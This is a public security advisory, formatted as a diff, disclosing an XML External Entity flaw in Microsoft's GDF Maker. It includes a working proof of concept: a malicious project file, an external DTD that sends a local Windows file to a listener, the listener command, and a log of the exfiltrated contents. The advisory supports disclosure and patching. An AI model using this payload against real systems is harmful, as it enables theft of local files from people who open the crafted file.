@@ -1,0 +1,125 @@
+[+] Credits: John Page (aka hyp3rlinx)		
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/MS-WINDOWS-GAME-DEFINITION-FILE-MAKER-v6.3.9600-XML-EXTERNAL-ENTITY.txt
+[+] ISR: ApparitionSec            
+ 
+
+
+Vendor:
+=================
+www.microsoft.com
+
+
+
+Product:
+===========
+GDFMaker v6.3.9600.16384
+
+Game Definition File Editor (gdfmaker.exe)
+
+The Game Definition File Editor is a graphical utility designed for creating localized game definition files (GDFs)
+as well as the necessary resource compiler scripts to compile game-definition files. The GDF editor uses a project-based
+format to organize data.
+
+
+
+
+Vulnerability Type:
+===================
+XML External Entity 
+
+
+
+CVE Reference:
+==============
+N/A
+
+
+
+Security Issue:
+================
+If a user loads an attacker supplied "GDFMakerProject" file type into GDF Maker using Ctrl+O or file menu, local files can be exfiltrated
+to remote attacker controlled server, as gdfmaker.exe is vulnerable to XML External Entity Expansion attacks.
+
+gdfmaker.exe can be found on Windows systems as part of Windows Kits: "C:\Program Files (x86)\Windows Kits\8.1\bin\x86\"
+
+Note: The malicious file has to be opened using Ctrl + O or File / Open, double clicking does not seem to trigger it.
+Victim may see an error like ... "There is an error in XML document(2,11)" and we get the victims file sent to our remote server.
+
+
+
+Exploit/POC:
+=============
+Steal "msdfmap.ini" used by Remote MS ADO services POC.
+
+
+1) "PWN.GDFMakerProject"
+
+<?xml version="1.0"?>
+<!DOCTYPE r [
+<!ENTITY % data3 SYSTEM "C:\Windows\msdfmap.ini">
+<!ENTITY % sp SYSTEM "http://127.0.0.1:8000/exfil.dtd">
+%sp;
+%param3;
+%exfil;
+]>
+
+
+2) "exfil.dtd"
+
+<!ENTITY % param3 "<!ENTITY &#x25; exfil SYSTEM 'http://localhost:8000/%data3;'>">
+
+
+3) Start our file listener on Port 8000
+
+
+C:\>python -m SimpleHTTPServer
+Serving HTTP on 0.0.0.0 port 8000 ...
+
+
+4) Open the infected file using Ctrl+O or File Menu Open methods.
+
+BOOOOM!
+
+127.0.0.1 - - [18/Oct/2017 14:17:54] "GET /exfil.dtd HTTP/1.1" 200 -
+127.0.0.1 - - [18/Oct/2017 14:17:54] code 404, message File not found
+127.0.0.1 - - [18/Oct/2017 14:17:54] "GET /;%5Bconnect%20name%5D%20will%20modify%20the%20connection%20if%20ADC.connect=%22name%22%0D%0A;%5Bconnect%20default%5D%20will%20modify%20the%20connection%20if%20name%20is%20not%20found%0D%0A;%5Bsql%20name%5D%20will%20modify%20the%20Sql%20if%20ADC.sql=%22name(args)%22%0D%0A;%5Bsql%20default%5D%20will%20modify%20the%20Sql%20if%20name%20is%20not%20found%0D%0A;Override%20strings:%20Connect,%20UserId,%20Password,%20Sql.%0D%0A;Only%20the%20Sql%20strings%20support%20parameters%20using%20%22?%22%0D%0A;The%20override%20strings%20must%20not%20equal%20%22%22%20or%
+20they%20are%20ignored%0D%0A;A%20Sql%20entry%20must%20exist%20in%20each%20sql%20section%20or%20the%20section%20is%20ignored%0D%0A;An%20Access%20entry%20must%20exist%20in%20each%20connect%20section%20or%20the%20section%20is%20ignored%0D%0A;Access=NoAccess%0D%0A;Access=ReadOnly%0D%0A;Access=ReadWrite%0D%0A;%5Buserlist%20name%5D%20allows%20specific%20users%20to%20have%20special%20access%0D%0A;The%20Access%20is%20computed%20as%20follows:%0D%0A;%20%20(1)%20First%20take%20the%20access%20of%20the%20connect%20section.%0D%0A;%20%20(2)%20If%20a%20user%20entry%20is%20found,%20it%20will%20override.%0D%0A%
+0D%0A%5Bconnect%20default%5D%0D%0A;If%20we%20want%20to%20disable%20unknown%20connect%20values,%20we%20set%20Access%20to%20NoAccess%0D%0AAccess=NoAccess%0D%0A%0D%0A%5Bsql%20default%5D%0D%0A;If%20we%20want%20to%20disable%20unknown%20sql%20values,%20we%20set%20Sql%20to%20an%20invalid%20query.%0D%0ASql=%22%20%22%0D%0A%0D%0A%5Bconnect%20CustomerDatabase%5D%0D%0AAccess=ReadWrite%0D%0AConnect=%22DSN=AdvWorks%22%0D%0A%0D%0A%5Bsql%20CustomerById%5D%0D%0ASql=%22SELECT%20*%20FROM%20Customers%20WHERE%20CustomerID%20=%20?%22%0D%0A%0D%0A%5Bconnect%20AuthorDatabase%5D%0D%0AAccess=ReadOnly%0D%0AConnect=%22DSN
+=MyLibraryInfo;UID=MyUserID;PWD=MyPassword%22%0D%0A%0D%0A%5Buserlist%20AuthorDatabase%5D%0D%0AAdministrator=ReadWrite%0D%0A%0D%0A%5Bsql%20AuthorById%5D%0D%0ASql=%22SELECT%20*%20FROM%20Authors%20WHERE%20au_id%20=%20?%22 HTTP/1.1" 404 -
+
+
+
+Network Access:
+===============
+Remote
+
+
+
+
+Severity:
+=========
+High
+
+
+
+Disclosure Timeline:
+=============================
+Vendor Notification: October 8, 2016
+Vendor reply : October 8, 2016 "Upon investigation we have determined that this does not meet the bar for security servicing as it would require an individual to download a malicious file from an untrusted source"
+vendor reply : November 5, 2016 "opened case 35611"
+vendor reply : November 8, 2016  "We have successfully reproduced the issue that you reported to us"
+Vendor reply : December 5, 2016 "will be fixing this issue in next version of SDK which will be released along with  major Windows update"
+October 18, 2017 : Public Disclosure
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. All content (c).
+
+hyp3rlinx
